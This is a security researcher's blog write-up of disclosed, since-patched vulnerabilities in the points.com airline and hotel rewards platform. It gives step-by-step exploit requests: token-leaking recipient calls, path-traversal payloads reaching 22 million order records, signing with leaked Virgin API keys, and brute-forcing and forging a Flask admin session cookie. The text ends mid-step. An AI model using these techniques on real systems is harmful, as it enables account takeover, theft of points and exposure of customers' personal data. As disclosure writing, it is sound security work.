---
source: sam-curry
source_url: https://samcurry.net/points-com
title: "Leaked Secrets and Unlimited Miles: Hacking the Largest Airline and Hotel Rewards Platform"
author: "Sam Curry"
published: 2023-08-03T00:00:00.000Z
description: "Between March 2023 and May 2023, we identified multiple security vulnerabilities within points.com, the backend provider for a significant portion of airline and hotel rewards programs. These vulnerabilities would have enabled an attacker to access sensitive customer account information, including names, billing addresses, redacted credit card details, emails, phone numbers, and transaction record"
---

[Back to blog](https://samcurry.net/)

# Leaked Secrets and Unlimited Miles: Hacking the Largest Airline and Hotel Rewards Platform

August 3, 2023

![Leaked Secrets and Unlimited Miles: Hacking the Largest Airline and Hotel Rewards Platform](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fpoints-man.png&w=3840&q=75)

## Introduction

Between March 2023 and May 2023, we identified multiple security vulnerabilities within points.com, the backend provider for a significant portion of airline and hotel rewards programs. These vulnerabilities would have enabled an attacker to access sensitive customer account information, including names, billing addresses, redacted credit card details, emails, phone numbers, and transaction records. Moreover, the attacker could exploit these vulnerabilities to perform actions such as transferring points from customer accounts and gaining unauthorized access to a global administrator website. This unauthorized access would grant the attacker full permissions to issue reward points, manage rewards programs, oversee customer accounts, and execute various administrative functions.

Upon reporting these vulnerabilities, the points.com team responded very quickly, acknowledging each report within an hour. They promptly took affected websites offline to conduct thorough investigations and subsequently patched all identified issues. All vulnerabilities reported in this blog post have since been remediated.

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fnick.png&w=3840&q=75)

## Collaborators

- Ian Carroll ( [https://twitter.com/iangcarroll](https://twitter.com/iangcarroll))
- Shubham Shah ( [https://twitter.com/infosec\_au](https://twitter.com/infosec_au))
- Sam Curry ( [https://twitter.com/samwcyo](https://twitter.com/samwcyo))

## High Level Overview

The following is a high level overview of the reported vulnerabilities. For the technical write-ups, please scroll down to the "Investigating Points.com" section.

**Directory Traversal leads to Query Access to Points.com Customer Order Records (March 7, 2023)**

Our first report was an unauthenticated HTTP path traversal allowing access to an internal API which would've allowed an attacker to query entries from a set of 22 million order records. The data within the records included partial credit card numbers, home addresses, email addresses, phone numbers, reward points numbers, customer authorization tokens, and miscellaneous transaction details. This information could be queried through an API call that returned one-hundred results per HTTP request. By appending optional sorting parameters, an attacker could enumerate the data or query for specific information (e.g. searching a customer's name or email address).

**Ability to Transfer Rewards Points and Leak Customer Information using only Rewards Number and Surname (March 7, 2023)**

The second vulnerability we reported was an authorization bypass that would allow an attacker to transfer airline rewards points from other users by knowing only their surname and rewards points number (both of these fields were disclosed in our first vulnerability report) via an improperly configured API. An attacker could generate full account authorization tokens which would allow them to manage customer accounts, view order history, view billing information, view contact information, and transfer points from customers.

For both of the initial reports, the team responded in under 10 minutes and immediately took the websites offline. The issues were quickly fixed and the websites were back online shortly thereafter.

**Leaked Tenant Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin (Add/Remove Rewards Points, Access Customer Accounts, Modify Rewards Program Settings, etc.)**

On May 2nd, 2023, we discovered an endpoint on a points.com-hosted Virgin rewards website that leaked the "macID" and "macKey" used by Virgin to authenticate to the core points.com API on behalf of the airline. The credentials could be used to fully authenticate as the airline to the "lcp.points.com" API by signing HTTP requests using the disclosed secret, allowing an attacker to call any of the API calls intended for the airline like modifying customer accounts, adding/removing points, or modifying settings related to the Virgin rewards program.

The points.com team responded and fixed the issue within only an hour.

**New Method for Transferring Airline Miles and Accessing Customer Account and Order Information from United MileagePlus members (April 29th, 2023)**

On April 29th, 2023, we identified an additional fourth vulnerability affecting specifically United Airlines where an attacker could generate an authorization token for any user knowing only their rewards number and surname. Through this issue, an attacker could both transfer miles to themselves and authenticate as the member on multiple apps related to MileagePlus, potentially including the MileagePlus administrator panel. This issue disclosed the member's name, billing address, redacted credit card information, email, phone number, and past transactions on the account.

After reporting the issue, the team responded in under 10 minutes and immediately took the website offline. The issue was quickly fixed and the website was back online shortly thereafter.

**Full Access to Global Points.com Administration Console and Loyalty Wallet Administration Panel via Weak Flask Session Secret (May 2nd, 2023)**

On May 2nd, 2023, we identified that the Flask session secret for the points.com global administration website used to manage all airline tenant and customer accounts was the word "secret". After discovering this vulnerability, we were able to resign our session cookies with full super administrator permissions.

After resigning the cookie with roles that give full administrator permissions, we observed that we could access all core administration functionality on the website, including user lookup, manual bonuses, rewards points conversion modifications (e.g. setting the exchange rate between two programs where 1 point would give you 1 million points), and many more points.com administrative endpoints (e.g. managing promotions, branding, resetting loyalty program credentials, etc.). An attacker could abuse this access to revoke existing reward program credentials and temporarily take down airline rewards functionality.

For our last vulnerability report, the team responded within an hour (even though we'd reported it at 3:30 AM CST) by taking the website offline and changing the secret.

## Investigating Points.com

With the cost of air travel becoming so expensive recently, I've gotten more and more into the "credit card churning" community where you can try to gamify credit cards and purchases to save rewards points which can be converted into things like flights and hotels. From a hacker's perspective, it's super interesting seeing a system that stores a numeric value that's essentially one-step from being used as an actual currency. The more and more I used these systems, the more interested I became in figuring out how they worked and what systems actually powered the rewards points industry.

I sent a message to [Ian Carroll](https://twitter.com/iangcarroll), someone who has a huge amount of experience hacking airlines who also runs an airline rewards booking website called [seats.aero](https://seats.aero/), expressing my interest in finding vulnerabilities in the rewards program infrastructure. After chatting for a while, we then pulled in [Shubham Shah](https://twitter.com/infosec_au), another another hacker who has been hunting on airlines for years, and started a group chat with the goal of finding security vulnerabilities affecting the rewards points ecosystem.

When we began our research, we found that a company called points.com was the provider for nearly all major rewards programs globally. Every airline that I'd ever flown had used points.com as their backend for storing and processing reward points. They seemed to be the leader in the space, and they even had a [security.txt](https://points.com/.well-known/security.txt) page on their website.

### How does it all work?

After searching through Github and reading points.com documentation for a few hours, we found that there was an API built for rewards programs to use running on the "lcp.points.com" website. While looking through public repositories, we found a link to what looked like API documentation for the "lcp.points.com" API that had since been removed from the internet. Luckily for us, there was a copy of it available on archive.org.

The archived API documentation described ways in which reward programs could authenticate users, reward loyalty points, transfer loyalty points, spend loyalty points, and much more.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2F_2P5YI18OR4quqRkLmkt4Tv14a9l9dCVUxkTB6lEJy_gF6OAcpjfonYrIrBo3G4V2HhqdINnzP3Pg2uthj5Qf9hsBea1j9Kxt4I-gxOVKtVybMSOsfoD6p6EkObXdl9gPuwdY1On04XTMjdIzI7kuIc&w=3840&q=75)

Our initial thought here was "how do we get access to use the API on behalf of a rewards program?", and after exploring a bit, we found the "console.points.com" website which allowed public registration for rewards programs to create skeleton accounts that had to be manually approved.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F7P2e-03SgzlTI8xxmn6X21f2ugydyrvRZ56u5YuHQhdrep-YcstLblWCpzwAvCkKasm0WUciJplWHgwPpYn384IZed6KMobHrmAtQ_Hcw3tdpjbt6URYpZljMd9uRbUgsYRQ6rvpVve69ARF2HGh6iA&w=3840&q=75)

After authenticating to this portal, we observed that it was an administration console for the rewards programs where they could initialize and manage OAuth-type apps. The apps were provisioned API keys that interacted with the "LCP API" (short for "Loyalty Commerce Platform") which was the "lcp.points.com" host.

The next thing we did was examine the JavaScript that powered the dashboard. We discovered that the website "console.points.com" appeared to be utilized by points.com employees for executing administrative actions concerning customer accounts, rewards programs, and managing components of the website itself.

The rewards program API used by rewards programs to manage points and customer accounts (lcp.points.com) required two keys to interact with it, both of which were distributed when you registered to the console.points.com website:

- macKeyIdentifier: essentially an OAuth client\_id
- macKey: essentially an OAuth client\_secret

Using the above two variables that we obtain by registering an app on "console.points.com", we were able to sign HTTP requests to the "lcp.points.com" host via the OAuth 2.0 MAC authentication scheme and call the loyalty platform API.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2F5zYgRBbnCgkIJI4sh1Y3TaiUopPSGq4gg3SUHaAay1zmHfZKYEcq4WN7jF6OEA_oe2DYWEJcYa3pYBYVaqWSXrDIHbIzS5CmBb-YE41QFv3h861mNt3_Ef57JONW_H240qzkdcOOzDoP1WJPnzs53bM&w=3840&q=75)

The fact that the platform employed this form of authorization was somewhat frustrating as it both meant we'd have to write a wrapper for signing HTTP requests to fuzz the API and that the secret key wouldn't be included in HTTP requests sent by the rewards programs. If we found a vulnerability like SSRF on an airline program, for example, the key itself would not be leaked to us, only the signature for the specific HTTP request that the airline was trying to make.

We fuzzed the API for a long time (manually signing each HTTP request using a Python script) and failed to find any one-off authorization vulnerabilities. It was trivial to find the numeric IDs of other airline programs, but unfortunately we were unable to find any basic core API vulnerabilities like IDOR or privilege escalation. We decided to change routes to better understand how the publicly listed customer rewards programs were using the points.com infrastructure.

## Exploring the United Airlines Points Management Website

Since United Airlines was leveraging points.com for their rewards program, we thought it would be interesting to test one of their apps that was integrated with points.com. We found the following MileagePlus domain which was used to buy, transfer, and manage MileagePlus miles:

```text
https://buymiles.mileageplus.com/united/united_landing_page/#/en-US
```

After fuzzing the site for a little while, we soon realized that the "buymiles.mileageplus.com" website was actually hosted by points.com and not United Airlines. We became super curious how the website worked from an authorization perspective and began to test the intended functionality of the site.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2F1XGVc3pi9VRxJ_XKj8sZ8Cz0HDcZAXzx-IsyFv_TrBPRkajKtQdoxnnY7AngtJBJLPKQguuCGni6dsje1ulngL8kqBSXWEg6fYvuMRlHng4dgvLDsGixIZZ8WzwbqjY1erEfLxjBDHUO7gbck_MoMwk&w=3840&q=75)

We continued using the "buymiles.mileageplus.com" website normally and observed the following flow after attempting to buy miles:

1. Click "Buy miles" on the "buymiles.mileageplus.com" website
2. Observe you are redirected to " [www.united.com](http://www.united.com/)" where we authenticate to an OAuth-type flow using our United MileagePlus username and password
3. Observe you are redirected via the "redirect\_uri" parameter to "buymiles.mileageplus.com" which then sends the following HTTP request using the authorization token obtained from authenticating with our username and password on " [www.united.com](http://www.united.com/)":

**HTTP Request**

```http
POST /mileage-plus/sessions/sso HTTP/2
Host: buymiles.mileageplus.com
Content-Type: application/json

{"mvUrl":"www_united_com_auth_token"}
```

**HTTP Response**

```http
HTTP/2 201 Created
Content-type: application/json

{"memberValidation": "points_com_user_auth_token"}
```

4. Using the returned "memberValidation" token from the above HTTP response, send another HTTP request to the following endpoint where "memberDetails" is the returned "memberValidation" token:

**HTTP Request**

```http
POST /payments/authentications/ HTTP/2
Host: buymiles.mileageplus.com
Content-Type: application/json

{"currency":"USD","memberDetails":"points_com_user_auth_token","transactionType":"buy_storefront"}
```

**HTTP Response**

```http
HTTP/201 Created
Content-type: application/json

{"email": "example@gmail.com", "firstName": "Samuel", "lastName": "Curry", "memberId": "EH123456"}
```

After completing the OAuth-type flow, it appeared that the "memberValidation" token acted as a user authorization token for the points.com airline tenant whereby we could use this token repeatedly to perform API calls and authenticate as a user.

If we could generate this token for another user, we would be able to perform actions on their account like transferring airline miles and retrieving their personal information. This became one of our goals as we learned more about how the airline website was leveraging the points.com infrastructure, and something we explored further.

## (1) Improper Authorization on Points Recipient Endpoint Allows Attacker to Authenticate as Any User Using Only Surname and Rewards Number

As we continued to look for issues which would allow us to leak someone's "memberValidation" token, one flow we found on the United website titled  "Buy miles for someone else".

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FbjX3VX9MG4yLqSrq_JjoXc0y4rjPGpgiZUmbeGZTwtuBI4uCzW9ZeLBE4OYAExUkZgEi4Wsp1yC0CfhCwdnHfTAksQrc9B1TBDDzx-JHtDwRUV22tdvaIxcViLj8CKsM8l-fh_6rIMYEXuP35fNxnaI&w=3840&q=75)

When you landed on this page as an authenticated MileagePlus user, it would ask you to add a recipient to send miles to. The recipient input field took in a first name, last name, and a MileagePlus number. When we sent the HTTP request to add the recipient, we noticed something super interesting returned in the response:

**HTTP Request**

```http
POST /mileage-plus/mvs/recipient HTTP/2
Host: buymiles.mileageplus.com
Content-Type: application/json

{"mvPayload":{"identifyingFactors":{"firstName":"Victim","lastName":"Victim","memberId":"EH123456"}},"lpId":"loyalty_program_uuid"}
```

**HTTP Response**

```http
HTTP/2 201 Created
Content-type: application/json

{"memberId": "EH123456", "links": {"self": {"href": "points_com_user_auth_token"}}, "membershipLevel": "1"}
```

The HTTP response contained the member's authorization token, something that we previously learned is used to retrieve their information and transfer miles on their behalf!

The vulnerability worked like this: by sending their first name, last name, and rewards number through the normal website UI for adding a points recipient, the server would return an authorization token in the HTTP response which could be used to retrieve their billing address, phone number, email, redacted credit card information, and billing history. We could additionally transfer miles on their behalf using this token.

To use the leaked token, we could simply take it and plug it into any of the API calls on the website and perform actions like transferring miles or simply retrieving the member's PII. We were able to fully authenticate into the victim account by only knowing their surname and rewards point number!

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F3_screenshot.png&w=3840&q=75)

### Escalating the issue to affect other rewards programs

At this point, after discovering it was possible to access customer accounts knowing only their surname and rewards number, we were curious if there were other endpoints on the "buymiles.mileageplus.com" site that had similar permission issues but didn't require us to know any prerequisite information about the customer (our bug felt very lame at this time).

We noticed that there was a parameter present in the original vulnerable HTTP request for generating member authorization tokens called "lpId''. According to the LCP API documentation, this parameter referred to the loyalty program UUID (e.g. Delta, United, Southwest, etc.). It appeared that the API on United's website was hitting the same API which other programs like Delta or Emirates used.

We were able to validate that we could exploit this vulnerability to access other rewards program customer accounts by swapping the loyalty program UUID and user rewards number to that of another program from our first vulnerability. If we swapped the loyalty UUID and rewards number to a Delta customer, it would return the authorization token a victim within the different rewards program.

Interestingly, this behavior also demonstrated that this was hitting a universal points.com API which seemed to be connected to all loyalty programs versus only United Airlines.

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fdelta-skymiles.png&w=3840&q=75)

After escalating the issue to generating authorization tokens for any airline, we began to fuzz the vulnerable HTTP request and soon realized that the loyalty program UUID parameter was being sent as an HTTP path argument to a proxied HTTP server.

We discovered this by observing strange behavior when appending a question mark and pound symbol at the end of the loyalty program ID parameter, breaking the HTTP request being sent by the server:

**HTTP Request**

```http
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com

{"mvPayload":{},"lpId":"0ccbb8ee-5129-44dd-9f66-a79eb853da73**#**"} <-- pound symbol appended
```

**HTTP Response**

```http
HTTP/1.1 400 Bad Request
Content-type: application/json

{"error":"Cannot process type 'text/html', expected 'application/json'"}
```

Our immediate guess was that the "lpId" parameter was being sent to the "lcp.points.com" API and, after we appended the question mark, it would break the HTTP response so that the backend could not interpret the HTTP response from the second server. We sought to confirm that by guessing the directories before and after the loyalty program UUID and seeing if the API would still function normally.

After testing for a while, we validated that each of the following payloads would allow us to normally add a recipient, allowing us to validate that the HTTP request was in-fact proxied to a second HTTP server. We did this by reading the LCP API documentation and observing that many of the HTTP requests with loyalty program UUIDs had a previous directory of "lps" and an appended directory of "mvs". By sending these additional directories and receiving the normal 200 OK HTTP response, it meant that we were able to traverse on the API and could potentially hit other API endpoints.

```http
"lpId":"/0ccbb8ee-5129-44dd-9f66-a79eb853da73"
"lpId":"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73"
"lpId":"0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"
"lpId":"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"
```

Based on our understanding of the LCP API OAuth 2.0 MAC authentication scheme, if these secondary context HTTP requests were directed towards the "lcp.points.com" host, they would need to be signed using the specific customers "macKey" and "macID" parameters.

The very strange and interesting thing, however, was that this HTTP request was able to generate authorization tokens for any rewards program. When we tried to do that ourselves using our provisioned "lcp.points.com" credentials, we received authorization errors saying that we did not have permission to access the specific route.

The first thing that came to mind after seeing that the HTTP request could generate authorization tokens for any rewards program was that the points.com United website (which was built and hosted by points.com) was using a "god token" as an authorization bearer that had access to all rewards programs when sending the HTTP request to generate the points.com member authorization token.

If this were the case and we could traverse the API, then we would be able to rewrite entire POST request to any "lcp.points.com" endpoint that had global permissions. Our new interest became finding an endpoint to traverse to so that we could test whether or not the HTTP request was indeed being signed by a "god token."

## (2) Directory Traversal on Privileged API leads to Access of 22 Million Customer Order Records for Points.com Reward Programs

To test our theory that the secondary context API may be using an authorization token that had global permissions, we sought to find other endpoints that we could traverse to and overwrite the entire API call where we could control the entire HTTP request. After taking a list of endpoints from the LCP API documentation, we ran them through an intruder configuration which tested for the specific endpoint with an appended "?" to cut off the remaining path.

As an example, to try to find the right directory for "/api/example" we'd send the following "lpId" payloads:

```http
"lpId":"/api/example?"
"lpId":"../api/example?"
"lpId":"../../api/example?"
```

Eventually, we had our first 200 OK HTTP response for the following payload:

**HTTP Request**

```http
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com
{"mvPayload":{},"lpId":"../../v1/search/orders/?"}
```

**HTTP Response**

```http
HTTP/2 400 Bad Request
Content-type: application/json

{"error":"Missing query parameter"}
```

After seeing the missing query parameter, we attempted to fuzz the GET parameters via the "lpId" parameter by appending them (e.g. /v1/search/orders?query=x) but weren't able to identify anything. This puzzled us for a bit, then we realized that the "/v1/search/orders" endpoint was a POST request that took a JSON body.

We saw the empty parameter "mvPayload" that we were sending and attempted to fuzz for parameters within the JSON body. Our intruder script ran, and then we saw one that was successful with a huge response size! It appeared the parameter "q" was the parameter the server was looking for.

By sending the following POST request, we were able to access the transaction data for all points.com loyalty programs including Delta, Emirates, Singapore Airlines, United, Etihad, Air Canada, Lufthansa, Southwest, Alaska, Hawaiian, and additionally many hotel reward points providers like Hilton, Marriott, and IHG:

**HTTP Request**

```http
POST /mileage-plus-transfer/mvs/recipient HTTP/1.1
Host: buymiles.mileageplus.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Content-Type: application/json
Content-Length: 59
Connection: close

{"mvPayload":{"q":"*"},"lpId":"../../v1/search/orders/?"}
```

**HTTP Response**

```http
HTTP/1.1 200 OK
Date: Fri, 10 Mar 2023 00:02:04 GMT
Content-Type: application/json

{
  "orders": [\
    {\
      "payment": {\
        "billingInfo": {\
        "cardName": "Visa",\
        "cardNumber": "XXXXXXXXXXXXXXXX",\
        "cardType": "VISA",\
        "city": "REDACTED",\
        "country": "US",\
        "expirationMonth": 7,\
        "expirationYear": 2023,\
        "firstName": "REDACTED",\
        "lastName": "REDACTED",\
        "phone": "REDACTED",\
        "state": "TX",\
        "street1": "REDACTED",\
        "zip": "REDACTED"\
      },\
      "costs": {\
        "baseCost": 275,\
        "fees": [],\
        "taxes": [],\
        "totalCost": 275\
      },\
      "currency": "USD",\
      "type": "creditCard"\
    },\
    "user": {\
      "balance": 94316,\
      "email": "REDACTED",\
      "firstName": "REDACTED",\
      "lastName": "REDACTED",\
      "memberId": "REDACTED",\
      "memberValidation": "https://lcp.points.com/v1/lps/LOYALTY_PROGRAM_ID/mvs/MEMBER_TOKEN",\
      "membershipLevel": "1"\
    },\
    "flightBookingDetails": {\
      "destinationCode": "MDW",\
      "destinationName": "Chicago (Midway), IL - MDW",\
      "originCode": "SDF",\
      "originName": "Louisville, KY - SDF",\
      "roundTrip": true\
    }\
  }\
],
"totalCount": "22745869"
}
```

Once we saw the HTTP response, we immediately reported the issue. There were over 22 million records that we could query from various airlines and hotel rewards programs. It appeared that the "macKey" and "macID" signing the HTTP request was a sort of "god key" which had access to all rewards program data.

This vulnerability affected all [nearly all points.com customers](https://www.points.com/partners/).

### Points.com Catches Us

Before we could even finish sending our report or see if other endpoints were accessible (e.g. adding points to a customer rewards account), the points.com team had detected our testing and had completely shut down United's production points.com website. Bummer! If we were malicious actors, we would've gotten caught trying to enumerate any significant number of records (the query returned 100 records per/request) via the exploit. The detection and response by the points.com team was seriously impressive.

After having tested the points.com infrastructure for a few days, we became increasingly interested in finding a vulnerability that would allow us to duplicate or generate unlimited miles. While the "buymiles.mileageplus.com" website was down, we began exploring the rest of the points.com infrastructure.

## (3) Leaked Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin, Add/Remove Rewards Points, Access Customer Accounts

Amidst our testing on points.com assets, we discovered a website used by Virgin rewards customers to earn points when shopping on partner websites at "shopsaway.virginatlantic.com".

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&w=3840&q=75)

This website was interesting to us, because it was hosted by points.com and likely leveraged credentials by either points.com or Virgin to access information related to their program.

We ran discovery tools on the asset and found various PHP endpoints, including a "login1.php" endpoint which returned the following information:

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&w=3840&q=75)

Within the HTTP response of the "login1.php" endpoint were what appeared to be a testing rewards member's profile information alongside various keys.

The keys disclosed included the customer's authorization token, but much more interestingly, the "macID" and "macKey" values for what we assumed were for Virgin's points.com production tenant account!

Based on our understanding of the "lcp.points.com" API, we could use those secrets to access the API on behalf of the airline. We sought out a way to validate this. After scouring the internet for a while, we discovered the following code which could be used to sign HTTP requests to the "lcp.points.com" API using the leaked credentials:

```python
if __name__ == '__main__':
    if '-u' not in sys.argv:
        exit("Usage: %s -u <macKeyIdentifier>:<macKey> [curl options...] <url>" % os.path.basename(__file__))
```

Using code from the [above Github repository built to help sign HTTP requests to "lcp.points.com"](https://github.com/xnt/Loyalty-Commerce-Platform/blob/0d9878bc29bae7c42e808b19865f6b91e1a02079/util/lcp_curl.py#L4), we could use the following syntax to send Virgin signed HTTP requests to the "lcp.points.com" API:

```sh
python lcp_curl.py -u MAC_ID:MAC_SECRET "https://lcp.points.com/v1/search/orders/?limit=1000"
```

After running the above script to sign an HTTP request on behalf of the Virgin program to "/v1/search/orders" endpoint, we received the following data back:

```json
{
  "orders": [\
    {\
      "payment": {\
      "billingInfo": {\
      "cardName": "Visa",\
      "cardNumber": "XXXXXXXXXXXXXXXX",\
      "cardType": "VISA",\
      "city": "REDACTED",\
      "country": "US",\
      "expirationMonth": 4,\
      "expirationYear": 2023,\
      "firstName": "REDACTED",\
      "lastName": "REDACTED",\
      "phone": "REDACTED",\
      "state": "CA",\
      "street1": "REDACTED",\
      "zip": "REDACTED"\
    }\
  ...\
  ],
  "totalCount": "2032431"
}
```

It worked!

This validated that the leaked credentials were valid and could be used to access the Virgin rewards program. An attacker could hit any of the "lcp.points.com" endpoints using these credentials, including administrative ones like adding/removing rewards points from customers, accessing customer accounts, and modifying tenant information related to the Virgin rewards program.

We reported the issue and the endpoint was removed within an hour.

## (4) Authorization Bypass on "widgets.unitedmileageplus.com" allows Attacker to Authenticate as Any User via Last Name and Rewards Number, Potential Access to United MileagePlus Administration Panel

On the United bug bounty program, there are a few domains that are explicitly out of scope including "mileageplus.com". Our guess why they're out of scope  is that many of the "mileageplus.com" subdomains are actually powered by points.com.

One of the subdomains of this site is "widgets.unitedmileageplus.com" which acts as a sort of SSO service for United MileagePlus members to authenticate into apps like "buymiles.mileageplus.com" and "mpxadmin.unitedmileageplus.com".

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&w=3840&q=75)

After enumerating the subdomain with [gau](https://github.com/lc/gau), we identified that there were various login pages that would authenticate you into related MileagePlus apps.

Each of these login pages expected different arguments: some would ask you for a United MileagePlus number and password, while others would ask you for a username, password, and an answer to your security questions. There was one very odd form, where it only asked you for your MileagePlus number and last name.

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&w=3840&q=75)

We found that the token returned from each of the different authorization methods were identical in format to each other. We tested and found that it was possible to copy the token from the HTTP response where you authenticated using only your surname and MileagePlus number into the consumer endpoints from the more secure username, password, and security question endpoints and you would be authenticated into any of the applications!

This meant that there was an authorization bypass where we could skip logging into the account with the member credentials and instead only provide their name and MileagePlus number.

From an impact perspective, there were various apps that were accessible via this bypass including the "buymiles.mileageplus.com" which disclosed PII and allowed us to transfer miles to ourselves. We went ahead and used this exploit to transfer miles from one of our own accounts to another, demonstrating that it was indeed possible to transfer another user's miles using this authorization bypass.

![](https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&w=3840&q=75)

The other much more interesting app that we could've (potentially) authenticated to was the "mpxadmin.unitedmileageplus.com" website. We were unable to confirm this because at the time of discovering the issue we didn't have the surname and a MileagePlus number of a United employee who may have had access to the app. If we did, we assume that it would've been possible and this level of access would allow us to manage the balances of customers, view transactions, and perform administrative actions for the MileagePlus rewards program.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&w=3840&q=75)

Since we couldn't confirm this, the hunt continued!

### Looking for something more critical…

The holy grail for us would be the ability to generate unlimited miles. We'd never be able to actually exploit it (ethically), but just the idea of finding a way to travel the world with free first class flights, five star hotels, cruises, and meals kept us going...

![(what our fantasy world looked like, given that we could discover a vulnerability to generate unlimited rewards points)](https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&w=3840&q=75)(what our fantasy world looked like, given that we could discover a vulnerability to generate unlimited rewards points)

### Switching Back to Hunting on the Points.com Global Administration Console

After realizing that we couldn't go much further impact wise hunting on the airline websites, we switched our focus back to the original website we found that was used by points.com employees and rewards program owners to administratively manage their customers and rewards programs.

From what we saw in the JavaScript on the "console.points.com" website, there were tons of endpoints that were only accessible to points.com employees. We tested these endpoints for a few more hours, trying and failing to find any sort of authorization bypass or way around the permission checks. After a little while longer of frustrated attempts to escalate our privileges, we zoomed out and realized something obvious that we had been overlooking the entire time...

## (5) Full Access to Core Points.com Administration Console and Loyalty Admin Website via Weak Flask Session Secret

After we finally stopped testing the APIs and looking for permission vulnerabilities, we realized that we'd totally forgotten to look at the session cookies!

Based on the format of the cookie, we could tell that it was some weird encrypted blob because on the JWT-looking format of it. It took us a little more poking but we eventually realized that the core app session token was a signed Flask session cookie.

```text
session=.eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU
```

We took the cookie and ran it through Ian Carroll's " [cookiemonster](https://github.com/iangcarroll/cookiemonster)" tool. This tool would automatically guess secrets used for signing the cookie by attempting to unsign it with a wordlist of known secrets. After a few seconds, we had a response!

```sh
zlz@htp ~> cookiemonster -cookie ".eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU"
🍪 CookieMonster 1.4.0
ℹ️ CookieMonster loaded the default wordlist; it has 38919 entries.
✅ Success! I discovered the key for this cookie with the flask decoder; it is "secret".
```

The Flask session secret for the website that was used by points.com employees to manage all rewards profiles, loyalty programs, and customer orders, was the word "secret". We could now theoretically sign our own cookie with whatever data we wanted, as long as the server wasn't including some unpredictable or signed piece of data within the cookie. We authenticated to the website and copied our session cookie over to flask-unsign to investigate the contents of the cookie:

```json
{"_csrf_token": "redacted", "_fresh": true, "_id": "redacted", "_user_id": "redacted", "sid": "redacted", "user": {"authenticationType": "account", "email": "samwcurry@gmail.com", "feature_flags": ["temp_resending_emails"], "groups": [], "id": "redacted", "mac_key": "redacted", "mac_key_identifier": "redacted", "roles": []}}
```

Based on what we saw in the decrypted body of our cookie, there wasn't anything unpredictable that would stop us from tampering with the cookie. The "roles" and "groups" arrays appeared most fruitful for escalating privileges since we could now re-sign it with any data we wanted, so we went back through the app and attempted to find JavaScript which related to these fields.

The role which looked the most privileged based on the information we found in the JavaScript was the "configeditor" role. We added this to our cookie along with the "admin" group and resigned it using the following command:

```sh
flask-unsign -s -S "secret" -c "{'_csrf_token': 'bb2cf0e85b20f13dcfebecb436c91b160f392fa2555961c23b3fcc67775edc50', '_fresh': True, '_id': 'a76abcdda16ed36f131df6e5f30c7e9cf142131ebcd4c0706b4c05ec720006daeaef804fcd925743954f10c8a5b3e10018216585157c88e6aedaa8fb42702dd3', '_user_id': '8547961e-b122-4b42-a124-4169cfc86a94', 'sid': 'bd2e7256bf1011eda2410242ac11000a', 'user': {'authenticationType': 'account', 'email': 'samwcurry@gmail.com', 'feature_flags': ['temp_resending_emails', 'v2_manual_bonus_page', 'v2_request_for_reimbursements'], 'groups': ['admin'], 'id': '8547961e-b122-4b42-a124-4169cfc86a94', 'mac_key': 'blLWTn1VyhIWNPoAVC2X9-Iqsqei7pEPkgXjxnhRepg=', 'mac_key_identifier': '8d261003b476497e8be4c2c077d69b5f', 'roles': [{'role': 'https://lcp.points.com/v1/roles/configeditor'}]}}"
```

The command resigned our cookie with the "secret" key and gave us the following cookie:

```sh
